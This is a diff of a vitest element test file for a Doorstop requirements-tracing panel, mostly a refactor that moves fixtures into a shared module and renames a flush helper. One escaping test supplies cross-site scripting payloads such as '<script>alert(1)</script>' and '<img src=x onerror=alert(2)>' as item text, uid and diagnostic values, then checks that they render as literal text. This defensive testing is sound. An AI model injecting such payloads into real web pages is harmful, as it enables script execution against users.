@@ -1,11 +1,13 @@
 // @vitest-environment happy-dom
 //
 // Element-level tests for the integration chain E2 panel element
-// (doorstop-panel-elements.ts), per plan §5: drive the controller directly
-// (DOM-free state logic is covered by doorstop-panel.test.ts) and reserve
-// these for template/event wiring — shadow-root content, toolbar chips,
-// item-list rows, the detail pane, the action rows' exact terminal command
-// strings, and the Ask-agent menu's prompt inserts.
+// (doorstop-panel-element.ts, re-exported by the doorstop-panel-elements.ts
+// barrel), per plan §5: drive the controller directly (DOM-free state logic is
+// covered by doorstop-panel.test.ts, and the pure view-model helpers by
+// doorstop-panel-view-model.test.ts) and reserve these for template/event
+// wiring — shadow-root content, toolbar chips, item-list rows, the detail
+// pane, the action rows' exact terminal command strings, and the Ask-agent
+// menu's prompt inserts.
 //
 // The controller host is the minimal mutable flag holder ({isConnected}).
 // The body mirrors controller state into its reactive properties exactly
@@ -14,10 +16,9 @@
 // element reads at click time, so every action test asserts the exact
 // `runCommand` input (title, command, metadata, open) and the completion
 // path (TerminalCommandRunHandle.completed → invalidate).
-
 import { afterEach, describe, expect, it, vi, type Mock } from "vitest";
 import type { TerminalCommandRun, TerminalCommandRunHandle, Workspace, WorkspacePanelContext } from "@jmfederico/pi-web/plugin-api";
-import type { DoorstopDocumentConfig, DoorstopIndex, ItemRecord, ItemStateKey } from "./doorstop-contract.js";
+import type { DoorstopDocumentConfig, DoorstopIndex, ItemRecord } from "./doorstop-contract.js";
 import {
   DOORSTOP_GIT_COMMIT_OPERATION,
   DOORSTOP_GIT_STAGE_OPERATION,
@@ -29,8 +30,7 @@ import {
   type DoorstopGitStatusResponse,
   type DoorstopRunResponse,
 } from "./doorstop-backend-contract.js";
-import { buildDoorstopIndex } from "./doorstop-model.js";
-import { computeItemStamp, computeItemStates } from "./doorstop-state.js";
+import { computeItemStamp } from "./doorstop-state.js";
 import {
   DoorstopWorkspaceController,
   doorstopPaths,
@@ -50,21 +50,16 @@ import {
   bodyElementTag,
   commitOutcomeText,
   defineDoorstopPanelElements,
-  documentStateDots,
   doorstopPublishCommand,
   doorstopPublishTarget,
   EMPTY_WORKSPACE_MESSAGE,
   FINDINGS_EMPTY_HINT,
   FINDINGS_EMPTY_MESSAGE,
   FINDINGS_PLUGIN_LOCAL_NOTE,
-  filteredItems,
   findingsCountText,
   findingsViewCounts,
   findingsViewRows,
   shortFingerprint,
-  STATE_CHIP_LABELS,
-  stateChipKind,
-  suspectParentItems,
   type DoorstopPanelBodyElement,
 } from "./doorstop-panel-elements.js";
 import {
@@ -73,16 +68,16 @@ import {
   fileEntry,
   text,
   tree,
-  type FakeWorkspaceFiles,
 } from "./test-support.js";
-
-const doorstopWorkspace: Workspace = {
-  id: "workspace-1",
-  projectId: "project-1",
-  path: "/repo",
-  label: "main",
-  isMain: true,
-};
+import {
+  flushMicro,
+  makeDocument,
+  makeItem,
+  makeResult,
+  makeTreeResult,
+  panelContext,
+  settle,
+} from "./test-fixtures.js";
 
 /** Provider metadata variants for the Phase D dispatch tests: the opendoor
  *  provider enables the backend path, the git provider (the usual fallback
@@ -119,104 +114,6 @@ afterEach(() => {
 });
 
 // --- small real-shape fixtures ---------------------------------------------------------
-
-function makeDocument(overrides: Partial<DoorstopDocumentConfig> = {}): DoorstopDocumentConfig {
-  return {
-    directoryPath: overrides.directoryPath ?? "reqs",
-    configPath: overrides.configPath ?? "reqs/.doorstop.yml",
-    prefix: overrides.prefix ?? "REQ",
-    digits: overrides.digits ?? 4,
-    separator: overrides.separator ?? "",
-    itemformat: overrides.itemformat ?? "yaml",
-    extra: overrides.extra ?? {},
-    ...(overrides.parentPrefix === undefined ? {} : { parentPrefix: overrides.parentPrefix }),
-  };
-}
-
-function makeItem(uid: string, documentPrefix: string, overrides: Partial<ItemRecord> = {}): ItemRecord {
-  return {
-    uid,
-    documentPrefix,
-    path: overrides.path ?? `${uid}.yml`,
-    level: overrides.level ?? "1.0",
-    active: overrides.active ?? true,
-    derived: overrides.derived ?? false,
-    normative: overrides.normative ?? true,
-    text: overrides.text ?? "",
-    ref: overrides.ref ?? "",
-    links: overrides.links ?? [],
-    reviewed: overrides.reviewed ?? null,
-    attributes: overrides.attributes ?? {},
-    raw: overrides.raw ?? {},
-    stateKeys: overrides.stateKeys ?? [],
-    ...(overrides.header === undefined ? {} : { header: overrides.header }),
-    ...(overrides.references === undefined ? {} : { references: overrides.references }),
-  };
-}
-
-function makeResult(
-  items: ItemRecord[],
-  documents: DoorstopDocumentConfig[],
-  diagnostics: DoorstopIndex["diagnostics"] = [],
-  knownFilePaths: ReadonlySet<string> = new Set(),
-): DoorstopWorkspaceResult {
-  const index = buildDoorstopIndex(documents, items, diagnostics, knownFilePaths);
-  computeItemStates(index);
-  return { index, settings: DEFAULT_OPENDOOR_SETTINGS };
-}
-
-/** The standard tree the panel tests render: REQ ← [TST], with one suspect
- *  link (REQ0002 → REQ0001 recorded against a stale stamp), one reviewed
- *  item (REQ0001), one clean child link (TST002 → REQ0001 with the current
- *  link-record stamp), and a missing reference (docs/gone.md). */
-function makeTreeResult(): DoorstopWorkspaceResult {
-  const reqConfig = makeDocument({ directoryPath: "reqs", configPath: "reqs/.doorstop.yml", prefix: "REQ", digits: 4 });
-  const tstConfig = makeDocument({
-    directoryPath: "tests",
-    configPath: "tests/.doorstop.yml",
-    prefix: "TST",
-    digits: 3,
-    parentPrefix: "REQ",
-  });
-  const req0001 = makeItem("REQ0001", "REQ", {
-    path: "reqs/REQ0001.yml",
-    level: "1.0",
-    text: "The system shall do X.",
-  });
-  // REQ0001 was reviewed against its current fingerprint.
-  req0001.reviewed = computeItemStamp(req0001, reqConfig, true);
-  // TST002 records the CURRENT link-record stamp of REQ0001 → ok link.
-  const parentStamp = computeItemStamp(req0001, reqConfig, false);
-  const req0002 = makeItem("REQ0002", "REQ", {
-    path: "reqs/REQ0002.yml",
-    level: "1.1",
-    header: "Capacity allocation",
-    text: "The system shall do Y.",
-    ref: "docs/spec.md",
-    references: [{ type: "file", path: "docs/gone.md" }],
-    links: [{ uid: "REQ0001", fingerprint: "STALE-stamp-0123456789" }],
-    attributes: { owner: "team-a", priority: 2 },
-  });
-  const tst001 = makeItem("TST001", "TST", {
-    path: "tests/TST001.yml",
-    level: "1.0",
-    text: "Verify X.",
-  });
-  const tst002 = makeItem("TST002", "TST", {
-    path: "tests/TST002.yml",
-    level: "1.1",
-    text: "Verify X end-to-end.",
-    links: [{ uid: "REQ0001", fingerprint: parentStamp }],
-  });
-  const knownFilePaths = new Set([
-    "reqs/REQ0001.yml",
-    "reqs/REQ0002.yml",
-    "tests/TST001.yml",
-    "tests/TST002.yml",
-    "docs/spec.md",
-  ]);
-  return makeResult([req0001, req0002, tst001, tst002], [reqConfig, tstConfig], [], knownFilePaths);
-}
 
 /** The REQ document config with an extended REVIEWED attribute ("owner") —
  *  the shape the "Changes since review" tests need so the field diff and the
@@ -264,20 +161,26 @@ function makeEditedItemResult(): DoorstopWorkspaceResult {
     digits: 3,
     parentPrefix: "REQ",
   });
-  const req0001 = makeItem("REQ0001", "REQ", {
+  const req0001 = makeItem({
+    uid: "REQ0001",
+    documentPrefix: "REQ",
     path: "reqs/REQ0001.yml",
     level: "1.0",
     text: "The system shall do X.",
   });
   req0001.reviewed = computeItemStamp(req0001, reqConfig, true);
-  const oldVersion = makeItem("REQ0003", "REQ", {
+  const oldVersion = makeItem({
+    uid: "REQ0003",
+    documentPrefix: "REQ",
     path: "reqs/REQ0003.yml",
     level: "1.2",
     text: "The system shall do Z.\nAnd approve.",
     links: [{ uid: "REQ0001", fingerprint: null }],
     attributes: { owner: "team-a" },
   });
-  const current = makeItem("REQ0003", "REQ", {
+  const current = makeItem({
+    uid: "REQ0003",
+    documentPrefix: "REQ",
     path: "reqs/REQ0003.yml",
     level: "1.2",
     text: "The system shall do Z.\nAnd approve.\nAsync.",
@@ -289,7 +192,9 @@ function makeEditedItemResult(): DoorstopWorkspaceResult {
   });
   // `reviewed` is the fingerprint of the REVIEWED (pre-edit) version.
   current.reviewed = computeItemStamp(oldVersion, reqConfig, true);
-  const req0002 = makeItem("REQ0002", "REQ", {
+  const req0002 = makeItem({
+    uid: "REQ0002",
+    documentPrefix: "REQ",
     path: "reqs/REQ0002.yml",
     level: "1.1",
     text: "The system shall do Y.",
@@ -363,106 +268,9 @@ async function mountBody(
   await body.updateComplete;
   await settle();
   bindBody(body, controller, created.context);
-  await flush(body);
+  await flushMicro(body);
   return { body, controller, context: created.context };
 }
-
-// --- pure helpers ----------------------------------------------------------------------
-
-describe("stateChipKind and STATE_CHIP_LABELS (chip color + label mapping)", () => {
-  it("maps every ItemStateKey to a label and a color kind", () => {
-    expect(Object.keys(STATE_CHIP_LABELS).sort()).toEqual(
-      [
-        "normative",
-        "non-normative",
-        "inactive",
-        "reviewed",
-        "unreviewed",
-        "suspect-link",
-        "no-child-links",
-        "no-links",
-        "unknown-link",
-        "missing-reference",
-      ].sort(),
-    );
-    // informational → muted
-    expect(stateChipKind("normative")).toBe("muted");
-    expect(stateChipKind("non-normative")).toBe("muted");
-    expect(stateChipKind("reviewed")).toBe("muted");
-    // warn-ish → warning
-    expect(stateChipKind("unreviewed")).toBe("warning");
-    expect(stateChipKind("no-child-links")).toBe("warning");
-    expect(stateChipKind("no-links")).toBe("warning");
-    // error-ish → danger
-    expect(stateChipKind("inactive")).toBe("danger");
-    expect(stateChipKind("suspect-link")).toBe("danger");
-    expect(stateChipKind("unknown-link")).toBe("danger");
-    expect(stateChipKind("missing-reference")).toBe("danger");
-  });
-});
-
-describe("documentStateDots (aggregate document state)", () => {
-  const doc = makeDocument({ prefix: "REQ" });
-
-  it("returns [] for a document with no items", () => {
-    expect(documentStateDots(doc, [])).toEqual([]);
-  });
-
-  it("returns a green ok dot when every item is reviewed with no suspect links", () => {
-    const item = makeItem("REQ0001", "REQ", { stateKeys: ["normative", "reviewed"] });
-    expect(documentStateDots(doc, [item])).toEqual(["ok"]);
-  });
-
-  it("adds an amber dot when any item is unreviewed", () => {
-    const item = makeItem("REQ0001", "REQ", { stateKeys: ["normative", "unreviewed"] });
-    expect(documentStateDots(doc, [item])).toEqual(["unreviewed"]);
-  });
-
-  it("adds a red dot when any item has a suspect link (amber kept)", () => {
-    const clean = makeItem("REQ0001", "REQ", { stateKeys: ["normative", "reviewed"] });
-    const suspect = makeItem("REQ0002", "REQ", { stateKeys: ["normative", "unreviewed", "suspect-link"] });
-    expect(documentStateDots(doc, [clean, suspect])).toEqual(["unreviewed", "suspect"]);
-  });
-});
-
-describe("suspectParentItems and filteredItems (pure selection helpers)", () => {
-  it("resolves the changed parents of a suspect link, matching the state chain", () => {
-    const result = makeTreeResult();
-    const req0002 = result.index.byUid.get("REQ0002");
-    const req0001 = result.index.byUid.get("REQ0001");
-    if (req0002 === undefined || req0001 === undefined) throw new Error("fixture");
-    expect(req0002.stateKeys).toContain("suspect-link");
-    expect(suspectParentItems(req0002, result.index).map((parent) => parent.uid)).toEqual(["REQ0001"]);
-    // TST002 recorded the current stamp → not suspect.
-    const tst002 = result.index.byUid.get("TST002");
-    if (tst002 === undefined) throw new Error("fixture");
-    expect(tst002.stateKeys).not.toContain("suspect-link");
-    expect(suspectParentItems(tst002, result.index)).toEqual([]);
-  });
-
-  it("filters by document prefix, state key, and search over uid/header/text", () => {
-    const result = makeTreeResult();
-    const index = result.index;
-    expect(index.items).toHaveLength(4);
-
-    expect(filteredItems(index, "REQ", undefined, "").map((item) => item.uid)).toEqual(["REQ0001", "REQ0002"]);
-    expect(filteredItems(index, undefined, undefined, "").map((item) => item.uid)).toEqual([
-      "REQ0001",
-      "TST001",
-      "REQ0002",
-      "TST002",
-    ]);
-    expect(filteredItems(index, undefined, "suspect-link", "").map((item) => item.uid)).toEqual(["REQ0002"]);
-    expect(filteredItems(index, undefined, "reviewed", "").map((item) => item.uid)).toEqual(["REQ0001"]);
-    // The empty string sentinel (the "All" chip's selectDocument("")) means all.
-    expect(filteredItems(index, "", undefined, "").map((item) => item.uid)).toHaveLength(4);
-    // Search over UID, header, and text.
-    expect(filteredItems(index, undefined, undefined, "REQ0002").map((item) => item.uid)).toEqual(["REQ0002"]);
-    expect(filteredItems(index, undefined, undefined, "capacity").map((item) => item.uid)).toEqual(["REQ0002"]);
-    expect(filteredItems(index, undefined, undefined, "verify").map((item) => item.uid)).toEqual(["TST001", "TST002"]);
-    expect(filteredItems(index, undefined, undefined, "nope")).toEqual([]);
-  });
-});
 
 // --- element tests ----------------------------------------------------------------------
 
@@ -496,7 +304,7 @@ describe("DoorstopPanelBodyElement (toolbar + empty/loading/error/stale states)"
     await settle();
     controller.error = "Workspace read failed: EACCES";
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
     const alert = body.shadowRoot?.querySelector<HTMLElement>(".doorstop-error[role=alert]");
     expect(alert?.textContent).toBe("Workspace read failed: EACCES");
   });
@@ -505,7 +313,7 @@ describe("DoorstopPanelBodyElement (toolbar + empty/loading/error/stale states)"
     const { body, controller, context } = await mountBody(() => Promise.resolve(makeTreeResult()));
     controller.stale = true;
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
     const stale = body.shadowRoot?.querySelector<HTMLElement>(".doorstop-stale");
     expect(stale?.textContent).toBe("stale — refresh");
     // The stale notice is a button: clicking it rescans the workspace.
@@ -516,7 +324,7 @@ describe("DoorstopPanelBodyElement (toolbar + empty/loading/error/stale states)"
 
     controller.stale = false;
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
     expect(body.shadowRoot?.querySelector(".doorstop-stale")).toBeNull();
   });
 
@@ -551,7 +359,7 @@ describe("DoorstopPanelBodyElement (toolbar + empty/loading/error/stale states)"
     reqChip.click();
     expect(controller.selectedDocumentPrefix).toBe("REQ");
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
     const uidCells = [...root.querySelectorAll(".doorstop-item-uid")].map((cell) => cell.textContent);
     expect(uidCells).toEqual(["REQ0001", "REQ0002"]);
 
@@ -560,7 +368,7 @@ describe("DoorstopPanelBodyElement (toolbar + empty/loading/error/stale states)"
     allChip?.click();
     expect(controller.selectedDocumentPrefix).toBe("");
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
     expect(root.querySelectorAll(".doorstop-item-row")).toHaveLength(4);
   });
 
@@ -588,7 +396,7 @@ describe("DoorstopPanelBodyElement (toolbar + empty/loading/error/stale states)"
 
   it("renders the diagnostics strip inside the stacked list, above the items, within the split", async () => {
     const reqConfig = makeDocument({ directoryPath: "reqs", configPath: "reqs/.doorstop.yml", prefix: "REQ", digits: 4 });
-    const item = makeItem("REQ0001", "REQ", { path: "reqs/REQ0001.yml", level: "1.0", text: "The system shall do X." });
+    const item = makeItem({ uid: "REQ0001", documentPrefix: "REQ", path: "reqs/REQ0001.yml", level: "1.0", text: "The system shall do X." });
     const { body } = await mountBody(() =>
       Promise.resolve(
         makeResult(
@@ -669,9 +477,9 @@ describe("DoorstopPanelBodyElement (layout sections: actions / filters / palette
     });
 
     body.shadowRoot?.querySelector<HTMLElement>(".doorstop-validate")?.click();
-    await flush(body);
+    await flushMicro(body);
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
     const root = body.shadowRoot;
     if (root === null) throw new Error("shadow root");
     // With a live run committed, the auto-expanded status bar is the LAST
@@ -738,7 +546,7 @@ describe("DoorstopPanelBodyElement (layout sections: actions / filters / palette
 
     // The findings view has no palette at all.
     root.querySelector<HTMLElement>(".doorstop-view-findings")?.click();
-    await flush(body);
+    await flushMicro(body);
     expect(root.querySelector(".doorstop-action-palette")).toBeNull();
 
     // A workspace with zero documents has no palette either.
@@ -752,7 +560,7 @@ describe("DoorstopPanelBodyElement (layout sections: actions / filters / palette
     if (root === null) throw new Error("shadow root");
     root.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0002"]')?.click();
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
 
     // The full action set lives in the palette section (placeholder replaced).
     const palette = root.querySelector(".doorstop-action-palette");
@@ -790,13 +598,13 @@ describe("DoorstopPanelBodyElement (layout sections: actions / filters / palette
       provider: opendoorProvider,
     });
     body.shadowRoot?.querySelector<HTMLElement>(".doorstop-validate")?.click();
-    await flush(body);
+    await flushMicro(body);
     // Switch to the findings view: the palette must vanish, the status bar
     // (and its already-expanded output) must remain.
     body.shadowRoot?.querySelector<HTMLElement>(".doorstop-view-findings")?.click();
-    await flush(body);
+    await flushMicro(body);
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
     expect(body.shadowRoot?.querySelector(".doorstop-action-palette")).toBeNull();
     expect(body.shadowRoot?.querySelector(".doorstop-status-bar")).not.toBeNull();
     expect(body.shadowRoot?.querySelector(".doorstop-last-run")).not.toBeNull();
@@ -851,7 +659,7 @@ describe("DoorstopPanelBodyElement (item list + selection)", () => {
     req0002Row.click();
     expect(controller.selectedUid).toBe("REQ0002");
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
     const detail = root.querySelector(".doorstop-detail");
     expect(detail?.textContent).toContain("REQ0002");
     expect(detail?.textContent).toContain("level 1.1");
@@ -875,7 +683,7 @@ describe("DoorstopPanelBodyElement (item list + selection)", () => {
     select.dispatchEvent(new Event("change"));
     expect(controller.stateFilter).toBe("suspect-link");
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
     expect([...root.querySelectorAll(".doorstop-item-uid")].map((cell) => cell.textContent)).toEqual(["REQ0002"]);
 
     // Back to All states, then search over text ("verify" → the TST items).
@@ -888,14 +696,14 @@ describe("DoorstopPanelBodyElement (item list + selection)", () => {
     search.dispatchEvent(new Event("input"));
     expect(controller.search).toBe("verify");
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
     expect([...root.querySelectorAll(".doorstop-item-uid")].map((cell) => cell.textContent)).toEqual(["TST001", "TST002"]);
 
     // A filter with no matches renders the muted no-match copy.
     search.value = "zzz";
     search.dispatchEvent(new Event("input"));
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
     expect(root.textContent).toContain("No items match the current document, state, or search filters.");
   });
 
@@ -913,7 +721,7 @@ describe("DoorstopPanelBodyElement (detail pane: links, references, attributes, 
     const row = root.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0002"]');
     row?.click();
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
 
     const linksOut = root.querySelector('.doorstop-detail [aria-label="Parent links"]');
     expect(linksOut?.textContent).toContain("REQ0001");
@@ -929,7 +737,7 @@ describe("DoorstopPanelBodyElement (detail pane: links, references, attributes, 
     linkRow?.click();
     expect(controller.selectedUid).toBe("REQ0001");
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
     expect(root.querySelector(".doorstop-detail")?.textContent).toContain("REQ0001");
     expect(root.querySelector(".doorstop-detail")?.textContent).toContain("The system shall do X.");
   });
@@ -941,13 +749,13 @@ describe("DoorstopPanelBodyElement (detail pane: links, references, attributes, 
     // Select TST002 (its link to REQ0001 is recorded with the current stamp).
     root.querySelector<HTMLElement>('.doorstop-item-row[data-uid="TST002"]')?.click();
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
     expect(root.querySelector('[aria-label="Parent links"]')?.textContent).toContain("ok");
 
     // Select REQ0001: TST002 shows up as a child link, clickable.
     root.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0001"]')?.click();
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
     const linksIn = root.querySelector('[aria-label="Child links"]');
     expect(linksIn?.textContent).toContain("TST002");
     root.querySelector<HTMLElement>('[aria-label="Child links"] .doorstop-link-row[data-uid="TST002"]')?.click();
@@ -960,7 +768,7 @@ describe("DoorstopPanelBodyElement (detail pane: links, references, attributes, 
     if (root === null) throw new Error("shadow root");
     root.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0002"]')?.click();
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
 
     const references = root.querySelector('[aria-label="File references"]');
     expect(references?.textContent).toContain("docs/spec.md");
@@ -989,7 +797,7 @@ describe("DoorstopPanelBodyElement (detail pane: links, references, attributes, 
     if (root === null) throw new Error("shadow root");
     root.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0002"]')?.click();
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
 
     const findings = root.querySelector('[aria-label="Findings for this item"]');
     expect(findings?.textContent).toContain("suspect link: REQ0001");
@@ -1003,12 +811,14 @@ describe("DoorstopPanelBodyElement (detail pane: links, references, attributes, 
     // The reviewed REQ0001 has no findings at all → the muted no-findings copy.
     root.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0001"]')?.click();
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
     expect(root.querySelector(".doorstop-detail")?.textContent).toContain("No local findings for this item.");
   });
 
   it("never injects raw HTML from text, header, attributes, uid, link UIDs, or diagnostics", async () => {
-    const evil = makeItem("REQ0001", "REQ", {
+    const evil = makeItem({
+      uid: "REQ0001",
+      documentPrefix: "REQ",
       text: "<script>alert(1)</script>",
       header: "<b>bold</b>",
       attributes: { payload: "<img src=x onerror=alert(2)>" },
@@ -1016,7 +826,7 @@ describe("DoorstopPanelBodyElement (detail pane: links, references, attributes, 
     });
     // A hostile uid must render as escaped text in both the list row and the
     // detail head (it is a distinct, non-colliding item).
-    const evilUid = makeItem("<svg onload=alert(4)>", "REQ", { text: "has a hostile uid" });
+    const evilUid = makeItem({ uid: "<svg onload=alert(4)>", documentPrefix: "REQ", text: "has a hostile uid" });
     const diagnostics: DoorstopIndex["diagnostics"] = [
       { severity: "warning", path: "reqs/<b>diag</b>.yml", message: "truncated <img src=x onerror=alert(5)>" },
     ];
@@ -1040,7 +850,7 @@ describe("DoorstopPanelBodyElement (detail pane: links, references, attributes, 
     // Selecting the hostile-uid item pins the detail-head uid as escaped text.
     evilUidRow?.click();
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
     const detail = root.querySelector(".doorstop-detail");
     if (detail === null) throw new Error("detail");
     expect(detail.querySelector(".doorstop-detail-uid")?.textContent).toBe("<svg onload=alert(4)>");
@@ -1050,7 +860,7 @@ describe("DoorstopPanelBodyElement (detail pane: links, references, attributes, 
     // all escape to literal text.
     root.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0001"]')?.click();
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
     const detail2 = root.querySelector(".doorstop-detail");
     if (detail2 === null) throw new Error("detail2");
     expect(detail2.textContent).toContain("<script>alert(1)</script>");
@@ -1120,7 +930,7 @@ describe("DoorstopPanelBodyElement (terminal actions: exact command lines + meta
     });
     // The skipped confirmation surfaces as a muted notice.
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
     expect(body.shadowRoot?.querySelector(".doorstop-confirm-skipped")?.textContent).toContain("confirmation skipped");
   });
 
@@ -1130,7 +940,7 @@ describe("DoorstopPanelBodyElement (terminal actions: exact command lines + meta
     if (root === null) throw new Error("shadow root");
     root.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0002"]')?.click();
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
 
     root.querySelector<HTMLElement>(".doorstop-review")?.click();
     expect(context.terminal.runCommand).toHaveBeenLastCalledWith({
@@ -1151,7 +961,7 @@ describe("DoorstopPanelBodyElement (terminal actions: exact command lines + meta
     // disabled with an explaining tooltip and clicks run nothing.
     root.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0001"]')?.click();
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
     const review = root.querySelector<HTMLButtonElement>(".doorstop-review");
     expect(review?.disabled).toBe(true);
     expect(review?.title).toContain("already reviewed");
@@ -1167,7 +977,7 @@ describe("DoorstopPanelBodyElement (terminal actions: exact command lines + meta
     if (root === null) throw new Error("shadow root");
     root.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0002"]')?.click();
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
 
     root.querySelector<HTMLElement>(".doorstop-clear")?.click();
     expect(context.terminal.runCommand).toHaveBeenLastCalledWith({
@@ -1180,7 +990,7 @@ describe("DoorstopPanelBodyElement (terminal actions: exact command lines + meta
     // TST001 has no suspect links: Clear is disabled with a tooltip.
     root.querySelector<HTMLElement>('.doorstop-item-row[data-uid="TST001"]')?.click();
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
     const clear = root.querySelector<HTMLButtonElement>(".doorstop-clear");
     expect(clear?.disabled).toBe(true);
     expect(clear?.title).toContain("No suspect links");
@@ -1192,7 +1002,7 @@ describe("DoorstopPanelBodyElement (terminal actions: exact command lines + meta
     if (root === null) throw new Error("shadow root");
     root.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0002"]')?.click();
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
 
     const unlinkInput = root.querySelector<HTMLInputElement>('.doorstop-target-input[data-op="unlink"]');
     const linkInput = root.querySelector<HTMLInputElement>('.doorstop-target-input[data-op="link"]');
@@ -1237,7 +1047,7 @@ describe("DoorstopPanelBodyElement (terminal actions: exact command lines + meta
     if (root === null) throw new Error("shadow root");
     root.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0002"]')?.click();
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
 
     const unlinkInput = root.querySelector<HTMLInputElement>('.doorstop-target-input[data-op="unlink"]');
     const linkInput = root.querySelector<HTMLInputElement>('.doorstop-target-input[data-op="link"]');
@@ -1245,7 +1055,7 @@ describe("DoorstopPanelBodyElement (terminal actions: exact command lines + meta
 
     // Empty input: a visible inline error, never a silent return, nothing runs.
     root.querySelector<HTMLElement>(".doorstop-unlink")?.click();
-    await flush(body);
+    await flushMicro(body);
     expect(root.querySelector(".doorstop-op-error")?.textContent).toContain("Enter a unlink target UID");
     expect(context.terminal.runCommand).not.toHaveBeenCalled();
     expect(unlinkInput.value).toBe(""); // kept (empty) for the user to fill in
@@ -1263,7 +1073,7 @@ describe("DoorstopPanelBodyElement (terminal actions: exact command lines + meta
       vi.mocked(context.terminal.runCommand).mockClear();
       linkInput.value = bad;
       root.querySelector<HTMLElement>(".doorstop-link")?.click();
-      await flush(body);
+      await flushMicro(body);
       expect(context.terminal.runCommand).not.toHaveBeenCalled();
       expect(root.querySelector(".doorstop-op-error")?.textContent).toContain("Invalid link target");
     }
@@ -1305,7 +1115,7 @@ describe("DoorstopPanelBodyElement (terminal actions: exact command lines + meta
 
     body.shadowRoot?.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0002"]')?.click();
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
     body.shadowRoot?.querySelector<HTMLElement>(".doorstop-review")?.click();
     await settle();
     expect(invalidate).not.toHaveBeenCalled(); // still running
@@ -1343,7 +1153,7 @@ describe("DoorstopPanelBodyElement (backend path + last run, Phase D)", () => {
     const invalidate = vi.spyOn(controller, "invalidate").mockImplementation(() => Promise.resolve());
 
     body.shadowRoot?.querySelector<HTMLElement>(".doorstop-validate")?.click();
-    await flush(body);
+    await flushMicro(body);
 
     // The structured request went to the backend; the terminal was NOT used;
     // one rescan followed; the in-flight marker cleared. The first backend
@@ -1374,7 +1184,7 @@ describe("DoorstopPanelBodyElement (backend path + last run, Phase D)", () => {
     // The mirrored status bar renders the badge, duration, and the
     // AUTO-EXPANDED output body (no user interaction needed).
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
     const root = body.shadowRoot;
     expect(root?.querySelector(".doorstop-status-bar")).not.toBeNull();
     expect(root?.querySelector(".doorstop-last-run")).not.toBeNull();
@@ -1390,7 +1200,7 @@ describe("DoorstopPanelBodyElement (backend path + last run, Phase D)", () => {
       provider: opendoorProvider,
     });
     failed.body.shadowRoot?.querySelector<HTMLElement>(".doorstop-validate")?.click();
-    await flush(failed.body);
+    await flushMicro(failed.body);
     expect(failed.controller.lastRun?.status).toBe("failed");
     expect(failed.controller.lastRun?.exitCode).toBe(3);
 
@@ -1403,11 +1213,11 @@ describe("DoorstopPanelBodyElement (backend path + last run, Phase D)", () => {
       provider: opendoorProvider,
     });
     killed.body.shadowRoot?.querySelector<HTMLElement>(".doorstop-validate")?.click();
-    await flush(killed.body);
+    await flushMicro(killed.body);
     expect(killed.controller.lastRun?.status).toBe("killed");
     expect(killed.controller.lastRun?.signal).toBe("SIGTERM");
     bindBody(killed.body, killed.controller, killed.context);
-    await flush(killed.body);
+    await flushMicro(killed.body);
     expect(killed.body.shadowRoot?.querySelector(".doorstop-status-bar")).not.toBeNull();
     expect(killed.body.shadowRoot?.querySelector(".doorstop-last-run-status")?.textContent).toBe(
       "killed (timeout)",
@@ -1429,7 +1239,7 @@ describe("DoorstopPanelBodyElement (backend path + last run, Phase D)", () => {
     const invalidate = vi.spyOn(controller, "invalidate").mockImplementation(() => Promise.resolve());
 
     body.shadowRoot?.querySelector<HTMLElement>(".doorstop-validate")?.click();
-    await flush(body);
+    await flushMicro(body);
 
     // The run never wrote to the workspace: no rescan. The server error text
     // is surfaced in the view record; the in-flight marker clears.
@@ -1440,7 +1250,7 @@ describe("DoorstopPanelBodyElement (backend path + last run, Phase D)", () => {
     expect(controller.lastRun?.errorMessage).toContain("doorstop CLI not found");
 
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
     const root = body.shadowRoot;
     // The error run is auto-expanded: the status bar shows the parsed error
     // message without any interaction.
@@ -1461,7 +1271,7 @@ describe("DoorstopPanelBodyElement (backend path + last run, Phase D)", () => {
       provider: gitProvider,
     });
